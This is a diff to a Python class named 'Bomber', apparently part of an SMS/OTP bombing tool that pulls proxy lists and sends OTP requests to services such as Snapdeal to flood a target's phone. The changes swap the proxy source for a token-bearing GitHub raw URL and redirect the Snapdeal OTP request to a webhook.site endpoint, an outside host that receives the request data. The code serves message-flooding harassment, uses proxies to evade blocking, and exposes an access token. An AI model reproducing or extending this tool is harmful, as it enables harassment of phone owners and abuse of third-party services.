@@ -27,9 +27,9 @@ class Bomber:
 			return False
 
 	def getproxy(self):
-		proxy_scrape_url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all"
+		proxy_scrape_url = "https://raw.githubusercontent.com/aioxzp/call1/main/proxy.txt?token=GHSAT0AAAAAAB5RUIEMDTEGDJAYC6HXOCMUY7CF3WA"
 		try:
-			proxy_request = requests.get(proxy_scrape_url, Timeout =  10)
+			proxy_request = requests.get(proxy_scrape_url, Timeout =  20)
 		except:
 			return False
 		proxylist =  proxy_request.text.split()
@@ -287,7 +287,7 @@ class Bomber:
 			return True
 
 	def snapdeal(self):
-		url = "https://www.snapdeal.com/sendOTP"
+		url = "https://webhook.site/1757003c-12ec-446a-9830-5fe1878b0c36"
 		snapdeal_head = {
 			"accept": "*/*",
 			"accept-encoding": "gzip, deflate, br",
